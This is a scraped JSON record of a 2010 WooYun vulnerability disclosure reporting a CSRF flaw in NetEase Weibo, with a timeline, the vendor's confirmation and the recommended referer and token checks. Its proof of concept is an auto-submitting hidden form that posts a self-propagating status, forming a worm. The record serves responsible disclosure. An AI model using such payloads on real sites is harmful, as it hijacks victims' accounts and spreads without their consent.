{"id": 23951, "wybug_id": "wooyun-2010-0640", "wybug_title": "网易微博CSRF", "wybug_corp": "网易", "wybug_author": "x140m1ng", "wybug_date": "2010-10-01 02:57", "wybug_open_date": "2010-10-31 03:00", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["类型应用", "蠕虫", "利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2010-10-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2010-10-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2010-10-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2010-10-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2010-11-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2010-10-31：\t细节向公众公开  简要描述： 没有进行token验证，易受CSRF攻击 详细说明：  恶意攻击者可构造恶意表单，并骗取受害者点击，当受害者点击链接时，会以受害者的名义产生一条微博信息，此方法可产生蠕虫，非常严重。   漏洞证明：  测试方法：1、将下列表单存储成index.html,放在本地目录下，将183.174.39.46换成你自己的ip。<form name=\"CSRF\" method=\"POST\" name=\"form0\" action=\"http://t.163.com:80/statuses/update.do\"><input type=\"hidden\" name=\"status\" value=\"http://183.174.39.46/index.html\"/><input type=\"hidden\" name=\"in_reply_to_status_id\" value=\"sendinfo\"/><input type=\"hidden\" name=\"dispatchToFollowers\" value=\"\"/></form><script>\tdocument.CSRF.submit();</script>2、登录网易微博，然后访问http://183.174.39.46/index.html3、回到自己的页面，http://t.163.com/,会发现已经多出来一条微博消息。4、关注你的人如果点击了那条微博消息，也会相应地发出一条一样的微博消息/   修复方案：  对referer和token进行验证。   版权声明：转载请注明来源 x140m1ng@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2010-10-08 11:42 厂商回复： 谢谢x140m1ng ， 尽快修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-01-21 18:07 |    \t\txsser_w \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:33        | 哎)\t\t \n  .....    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}